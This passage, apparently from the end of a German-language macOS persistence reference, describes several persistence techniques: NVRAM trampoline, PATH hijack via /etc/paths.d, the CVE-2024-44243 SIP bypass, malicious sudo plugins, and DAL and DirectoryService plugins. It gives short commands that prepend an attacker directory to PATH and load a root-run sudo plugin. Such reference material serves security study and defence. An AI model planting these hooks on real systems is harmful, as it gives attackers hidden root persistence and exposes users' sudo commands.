Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Der Boot-Task `rc.trampoline` führt beim Booten eine **plattformgebundene (von Apple signierte) Binärdatei** aus, die in der NVRAM-Variable `apple-trusted-trampoline` gespeichert ist. Dies geschieht jedoch **nur, wenn das Boot-Arg `rc.trampoline=1` gesetzt und SIP deaktiviert ist** (mit einer Größenbeschränkung von ~390&nbsp;KB sowie der Einschränkung, dass die Ausführung blockieren oder schnell zurückkehren muss). Da dafür **Root-Zugriff + deaktiviertes SIP + ein von Apple signiertes Payload** erforderlich sind, ist die Technik für Persistence in der Praxis kaum umsetzbar und wird hier nur der Vollständigkeit halber aufgeführt.<sup>[[41]](#references)</sup>

### /etc/paths und /etc/paths.d (PATH-Hijack)

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (zum Schreiben ist Root-Zugriff erforderlich)
- Root-Zugriff erforderlich

#### Speicherort

- **`/etc/paths`** und **`/etc/paths.d/*`** — werden von **`path_helper`** (aufgerufen über `/etc/zprofile`) gelesen, um beim Login den standardmäßigen `PATH` zu erstellen.

#### Beschreibung & Ausnutzung

Beide gehören Root. Wird ein vom Angreifer kontrolliertes Verzeichnis vorangestellt (durch Bearbeiten von `/etc/paths` oder Ablegen einer Datei in `/etc/paths.d/`), erscheint dieses Verzeichnis früh in `PATH` jeder neuen Login-Shell. Dadurch **überschattet** eine bösartige Binärdatei mit dem Namen eines gängigen Befehls (`ls`, `git`, …) das echte Programm und wird ausgeführt, sobald das Opfer den Befehl das nächste Mal aufruft.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP-Umgehung (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Nützlich zur Sandbox-Umgehung: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich)
- Root erforderlich; Ergebnis: **SIP wird umgangen**. Betroffen sind macOS **15.0–15.1**, behoben in **15.2**

#### Speicherort

- Ein Filesystem-Bundle in **`/Library/Filesystems/`** ablegen.

#### Beschreibung & Ausnutzung

`storagekitd` besitzt das Entitlement **`com.apple.rootless.install.heritable`** und startete die Binärdateien von Filesystem-Bundles mit dieser SIP-umgehenden Fähigkeit **geerbt**. Durch das Einschleusen eines bösartigen Filesystem-Bundles konnte ein Angreifer Code mit SIP-Umgehung ausführen, um **persistente Kernel-Erweiterungen** zu installieren oder in SIP-geschützte `LaunchDaemon`-Verzeichnisse zu schreiben – eine Persistenz, die normale Schutzmaßnahmen übersteht und aushebelt.<sup>[[46]](#references)</sup> Apple behob das Problem in macOS Sequoia 15.2.

### sudo-Plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Nützlich zur Sandbox-Umgehung: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich, um `/etc/sudo.conf` zu schreiben)
- Root erforderlich für die Installation; das Plugin läuft anschließend bei **jedem `sudo`-Aufruf** (im setuid-root-Kontext)

#### Speicherort

- **`/etc/sudo.conf`** — `Plugin`-Zeilen laden Shared Objects aus **`/usr/libexec/sudo/`** (oder einem absoluten Pfad). Die Datei ist standardmäßig nicht vorhanden (sudo verwendet eine integrierte Richtlinie), daher ist ihre Erstellung ein sauberer Hook.

#### Beschreibung & Ausnutzung

`sudo` lädt seine Richtlinien-/Genehmigungs-/Audit-Plugins aus `/etc/sudo.conf`. Da `sudo` setuid-root ist, wird ein bösartiges Shared-Object-Plugin **jedes Mal mit Root-Rechten ausgeführt, wenn ein beliebiger Benutzer `sudo` ausführt** – eine dauerhafte Root-Persistenz, die außerdem jeden sudo-Befehl erfasst.<sup>[[51]](#references)</sup> macOS wird mit sudo 1.9.x ausgeliefert, das die Plugin-API unterstützt.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimalbeispiel: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Veralteter Mechanismus:** Seit macOS 12.3 deprecated. macOS 14.1 und neuer deaktivieren veraltete Video-Plug-ins standardmäßig. Bevor dieser Weg funktionieren kann, muss ein Benutzer die Unterstützung für veraltete Video-Plug-ins über die Recovery wiederherstellen; ein beschreibbares Verzeichnis allein reicht nicht aus. [Aktuelle Support-Anleitung von Apple](https://support.apple.com/en-us/108387).
- Zum Schreiben in das Plug-in-Verzeichnis sind Root-Rechte erforderlich. Die Codeausführung hängt davon ab, dass ein kompatibler Client DAL-Plug-ins weiterhin lädt; dies wurde unter macOS 26 nicht zur Laufzeit getestet.

#### Speicherort

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root-Rechte erforderlich
  - **Auslöser:** Ein kompatibler Kamera-Client listet Geräte auf, **nachdem die Unterstützung für veraltete Plug-ins wiederhergestellt wurde**. Die Library Validation des Clients kann ein Plug-in eines Drittanbieters blockieren.

#### Beschreibung und Ausnutzung

CoreMediaIO-**DAL**-Plug-ins (Device Abstraction Layer) wurden von manchen Kamera-Apps im Prozess geladen. Apples [Präsentation zu Camera Extensions](https://developer.apple.com/videos/play/wwdc2022/10022/) weist ausdrücklich darauf hin, dass veraltete DAL-Plug-ins mit FaceTime, QuickTime Player oder Photo Booth **nicht** funktionierten und viele andere Clients Library Validation erzwingen. Moderne [Core Media I/O Extensions](https://developer.apple.com/documentation/coremediaio) laufen außerhalb des Prozesses und haben ein separates Installations- und Genehmigungsmodell. Die historische In-Process-Technik bedeutet nicht, dass sie eine allgemeine Umgehung von Camera TCC auf aktuellen macOS-Versionen ermöglicht.<sup>[[53]](#references)[[54]](#references)</sup>

Read-only-Beobachtung unter macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` ist vorhanden und gehört Root. Weder die Unterstützung für veraltete Plug-ins noch das Laden durch einen Client wurde verifiziert.

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Veralteter, bedingter Mechanismus:** Erfordert Root-Rechte für die Installation sowie ein Plug-in, das tatsächlich konfiguriert und geladen wird. Die Plug-in-API von DirectoryService ist deprecated; prüfe die Open-Directory-Konfiguration des Ziel-Macs, bevor du dies als Boot-Auslöser einstufst.

#### Speicherort

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root-Rechte erforderlich
  - **Auslöser:** `dspluginhelperd` lädt ein geeignetes, konfiguriertes Plug-in, wenn Open Directory es benötigt. In Apples [Leitfaden zur Plug-in-Laufzeitumgebung](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) heißt es, dass Plug-ins, die nicht für den Start konfiguriert sind, bei Bedarf geladen werden können, sobald ihr Node geöffnet wird.

#### Beschreibung und Ausnutzung

`dspluginhelperd` unterstützt veraltete DirectoryService-Plug-in-Bundles. Ein schädliches Plug-in kann einen privilegierten Ausführungspfad darstellen, wenn das veraltete Plug-in akzeptiert und aktiviert wird. Dies unterscheidet sich von PAM- und Authorization-Plugins. Dass das Verzeichnis vorhanden ist, belegt nicht, dass ein neu hineingeschriebenes Plug-in beim nächsten Start ausgeführt wird. Apples lokale Handbücher `dspluginhelperd(8)` und `opendirectoryd(8)` unter macOS 26.5 führen den Helper und diesen veralteten Pfad weiterhin auf.<sup>[[53]](#references)</sup>

Read-only-Beobachtung unter macOS 26: `/Library/DirectoryServices/PlugIns` und `/usr/libexec/dspluginhelperd` sind vorhanden. Während dieses Tests wurde kein Plug-in installiert, konfiguriert oder geladen.

## Persistence-Techniken und Tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Jenseits der guten alten LaunchAgents – 1 – Shell-Startdateien](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Jenseits der guten alten LaunchAgents – 18 – X11 und XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Jenseits der guten alten LaunchAgents – 21 – Erneut geöffnete Apps](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Jenseits der guten alten LaunchAgents – 20 – Terminal-Einstellungen](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Jenseits der guten alten LaunchAgents – 13 – Audio-Plug-ins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit-Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Jenseits der guten alten LaunchAgents – 12 – QuickLook-Plug-ins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Jenseits der guten alten LaunchAgents – 22 – LoginHook und LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Jenseits der guten alten LaunchAgents – 4 – cron-Jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Jenseits der guten alten LaunchAgents – 2 – iTerm2-Start](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Jenseits der guten alten LaunchAgents – 7 – xbar-Plug-ins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Jenseits der guten alten LaunchAgents – 8 – Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Jenseits der guten alten LaunchAgents – 6 – SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Jenseits der guten alten LaunchAgents – 3 – Login-Objekte](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Jenseits der guten alten LaunchAgents – 14 – atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Jenseits der guten alten LaunchAgents – 24 – Ordneraktionen](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Ordneraktionen für Persistence unter macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Jenseits der guten alten LaunchAgents – 27 – Dock-Kurzbefehle](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Jenseits der guten alten LaunchAgents – 17 – Farbwähler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Jenseits der guten alten LaunchAgents – 26 – Finder-Sync-Plug-ins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analyse der Persistence von „Mac File Opener“ (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Jenseits der guten alten LaunchAgents – 16 – Bildschirmschoner](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zugriff sichern: Bildschirmschoner für Persistence unter macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Jenseits der guten alten LaunchAgents – 11 – Spotlight-Importer](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Jenseits der guten alten LaunchAgents – 9 – Einstellungsbereich](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Jenseits der guten alten LaunchAgents – 19 – Periodische Skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Jenseits der guten alten LaunchAgents – 5 – Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Jenseits der guten alten LaunchAgents – 28 – Authorization-Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Dauerhafter Diebstahl von Zugangsdaten mit Authorization-Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Jenseits der guten alten LaunchAgents – 30 – Die Konfigurationsdatei von man – man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Jenseits der guten alten LaunchAgents – 25 – Apache2-Module](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Jenseits der guten alten LaunchAgents – 31 – BSM-Audit-Framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Jenseits der guten alten LaunchAgents – 23 – emond, der Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Jenseits der guten alten LaunchAgents – 29 – amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Jenseits der guten alten LaunchAgents – 15 – xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Jenseits der guten alten LaunchAgents – 10 – Skriptdateien von Apps](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Jenseits der guten alten LaunchAgents – 32 – Dock-Kachel-Plug-ins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Jenseits der guten alten LaunchAgents – 33 – Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Jenseits der guten alten LaunchAgents – 34 – launchd-Boot-Aufgaben](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Jenseits der guten alten LaunchAgents – 35 – Persistence über NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [E-Mail für Persistence unter OS X verwenden (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Verdächtige Änderung der Apple-Mail-Regel-Plist (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Schädliche Profile – eine der schwerwiegendsten Bedrohungen für Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 – Kap. 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analyse von CVE-2024-44243, einer macOS-SIP-Umgehung über Kernel Extensions (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE und Exfiltration von API-Tokens über Claude-Code-Projektdateien (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Neue Schwachstelle in GitHub Copilot und Cursor – Hintertür über Rules-Datei (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome – Alternative Installationsmethoden (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [ExtensionInstallForcelist in Chrome auf dem Mac entfernen (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Über das Schreiben von Sudo-Plug-ins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Remote Mac-Exploitation über benutzerdefinierte URL-Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Zwei macOS-Persistence-Tricks durch Missbrauch von Plug-ins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO-DAL-Minimalbeispiel (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Analyse einer Spotlight-basierten macOS-TCC-Schwachstelle (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentation des Python-`site`-Moduls (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Von Spotlight zu Apple Intelligence – Missbrauch eines 0day zum Diebstahl der Daten, die macOS AI antreiben](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
